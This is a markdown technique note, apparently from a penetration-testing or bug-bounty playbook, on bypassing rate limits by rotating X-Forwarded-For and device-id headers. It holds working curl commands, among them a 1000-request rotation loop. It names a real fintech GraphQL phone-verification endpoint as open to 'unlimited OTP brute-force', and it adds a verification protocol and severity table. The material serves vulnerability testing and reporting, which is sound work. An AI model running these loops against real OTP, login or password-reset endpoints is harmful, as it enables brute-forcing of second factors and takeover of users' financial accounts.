# Rate Limit Bypass via Header Rotation (X-Forwarded-For + Device-ID)

## Trigger
- Target has per-IP rate limiting (429 after N requests)
- Target uses device-id or similar client identifier for rate limit bucketing
- Fintech/crypto platforms with OTP verification endpoints

## Technique: X-Forwarded-For Rate Limit Bypass

When a backend sits behind Cloudflare or a reverse proxy and trusts
X-Forwarded-For for rate-limit bucketing:

```bash
# Test if XFF bypasses rate limit after being 429'd
curl -sk -X POST "$ENDPOINT" \
  -H "X-Forwarded-For: 1.2.3.4" \
  -H "Content-Type: application/json" \
  -d '...'
# If 200/400 (not 429) -> XFF bypass confirmed
```

### Rotation pattern for unlimited requests:
```bash
for i in $(seq 1 1000); do
  curl -sk -X POST "$ENDPOINT" \
    -H "X-Forwarded-For: ${i}.${RANDOM}.${i}.${RANDOM}" \
    -H "device-id: device-${RANDOM}-${i}" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD"
done
```

## Technique: Device-ID Rotation

Mobile apps often use a `device-id` header for rate-limit bucketing instead of IP.
Each unique device-id gets its own rate limit window.

```bash
# With mobile User-Agent to trigger mobile code path
curl -sk -X POST "$ENDPOINT" \
  -H "User-Agent: AppName/1.0 (com.app.name; Android 14)" \
  -H "device-id: unique-per-request-$(date +%s%N)" \
  -H "Content-Type: application/json" \
  -d '...'
```

## Combined Chain (Maximum Bypass)

Rotate BOTH headers simultaneously:
1. device-id rotation -> bypass per-device rate limit
2. X-Forwarded-For rotation -> bypass per-IP rate limit  
3. Result: unlimited requests with zero rate limiting

## Uphold Example (June 2026)

- Endpoint: `POST api.uphold.com/graphql`
- Mutation: `verifyPhone(input:{id:"...", token:"..."})`
- Without bypass: 429 after ~20 requests
- With device-id rotation only: bypasses per-device limit
- With XFF + device-id: 20/20 requests processed, ZERO 429
- Sandbox: 30/30 unlimited (no IP rate limit at all)
- Impact: Unlimited OTP brute-force on fintech platform

## Verification Protocol

1. First confirm rate limit exists (send 25+ requests, observe 429)
2. Test XFF alone: single request with spoofed IP after 429
3. Test device-id alone: single request with fresh device-id after 429
4. Test combined: burst of 20+ requests with both rotating
5. Document: N/N requests processed vs N 429s = proof

## Severity Assessment

| Context | Severity |
|---------|----------|
| OTP/2FA endpoint on fintech | High-Critical |
| Login brute-force | High |
| Password reset | Medium-High |
| Generic API endpoint | Low-Medium |

## Pitfalls
- Some proxies strip XFF (Cloudflare may override with CF-Connecting-IP)
- If backend uses CF-Connecting-IP instead of XFF, this won't work
- Always test AFTER confirming natural rate limit (429) first
- Document the 429 state BEFORE the bypass to prove differential
